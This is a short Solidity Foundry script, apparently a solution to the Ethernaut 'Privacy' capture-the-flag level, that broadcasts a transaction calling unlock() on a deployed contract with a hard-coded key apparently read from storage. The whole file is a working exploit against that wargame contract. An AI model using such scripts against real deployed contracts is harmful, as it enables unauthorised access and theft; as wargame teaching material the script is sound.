// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level12.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenHack is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
        Privacy privacyInstance = Privacy(0x34D0b5CE3047f9D6F528C5B33Fb272aF7d1DA1Cf);
        privacyInstance.unlock(0x4b7f8c3e6b5925315790c22896cb077b);
        vm.stopBroadcast();
    }
}